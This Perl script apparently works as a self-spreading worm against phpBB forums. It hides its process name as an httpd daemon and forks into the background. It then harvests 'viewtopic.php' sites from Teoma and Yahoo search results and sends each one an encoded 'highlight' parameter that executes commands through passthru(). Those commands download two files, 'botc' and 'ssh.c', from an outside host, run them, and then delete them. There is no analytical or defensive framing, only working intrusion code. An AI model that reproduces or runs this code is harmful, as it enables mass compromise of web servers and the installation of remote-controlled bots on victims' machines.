#/usr/bin/perl

use IO::Socket;
use LWP::Simple;
my $processo = "/usr/bin/httpd -DSSL";
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

@vul = "";
$a=0;
$numero = int rand(999);
$site = "s.teoma.com";
$procura = "viewtopic.php%3ft%3d$numero";

######################################
for($n=0;$n<90;$n += 1){
$sock = 
IO::Socket::INET->new(PeerAddr=>"$site",PeerPort=>"80",Proto=>"tcp") or 
next;
print $sock "GET /search?q=$procura&qcat=1&qsrc=0&page=$n 
HTTP/1.0\n\n";
@resu = <$sock>;
close($sock);
$ae = "@resu";
@resu = <$sock>;
close($sock);
$ae = "@resu";
while ($ae=~ m/<a href=.*?>.*?<\/a>/){
   $ae=~ s/<a href=(.*?)>.*?<\/a>/$1/;
   $uber=$1;
if ($uber !~/translate/)
{if ($uber !~ /cache/)
{if ($uber !~ /"/)
{if ($uber !~ /google/)
{if ($uber !~ /216/)
{if ($uber =~/http/)
{if ($uber !~ /start=/)
{
if ($uber =~/&/)
    {
    $nu = index $uber, '&';
    $uber = substr($uber,0,$nu);
    }
$vul[$a] = $uber;
$a++;
}}}}}}}}}
##########################
for($cadenu=1;$cadenu <= 99; $cadenu +=10){

@cade = 
get("http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=1&b=$cadenu") 
or next;
$ae = "@cade";

while ($ae=~ m/<em class=yschurl>.*?<\/em>/){
   $ae=~ s/<em class=yschurl>(.*?)<\/em>/$1/;
   $uber=$1;

$uber =~ s/ //g;
$uber =~ s/<b>//g;
$uber =~ s/<\/b>//g;
$uber =~ s/<wbr>//g;

if ($uber =~/&/)
    {
    $nu = index $uber, '&';
    $uber = substr($uber,0,$nu);
    }
$vul[$a] = $uber;
$a++
}}

#########################


$cmd = '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20cd /tmp;wget 
civa.org/pdf/botc;perl botc;wget civa.org/pdf/ssh.c;perl ssh.c;rm -rf 
bot* 
ssh.*%3B%20%65%63%68%6F%20%5F%45%4E%44%5F&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';

$b = scalar(@vul);

for($a=0;$a<=$b;$a++)
{

$sitevul = $vul[$a].$cmd;
if($sitevul !~/http/){ $sitevul = 'http://'.$sitevul; }
$res = get($sitevul) or next;
}

